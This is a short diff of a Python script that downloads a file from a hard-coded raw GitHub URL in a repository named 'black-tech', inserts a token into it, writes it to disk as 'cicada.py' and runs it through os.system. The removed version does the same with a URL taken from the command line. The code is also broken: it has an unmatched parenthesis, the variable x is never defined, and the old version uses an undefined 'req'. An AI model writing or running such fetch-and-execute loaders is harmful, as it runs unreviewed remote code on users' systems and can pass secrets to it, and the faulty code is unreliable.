@@ -1,4 +1,8 @@
-import urllib.request, sys, os
-code = req.urlopen(sys.argv[1]).read().decode()
-open('o', 'w').write(code)
-os.system('python o')
+from urllib.request import urlopen
+import os
+
+url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/over.py'
+path = 'cicada.py'
+code = urlopen(url).read().decode())
+open(path, 'w').write(code.replace('<token>', x))
+os.system('python '+path)
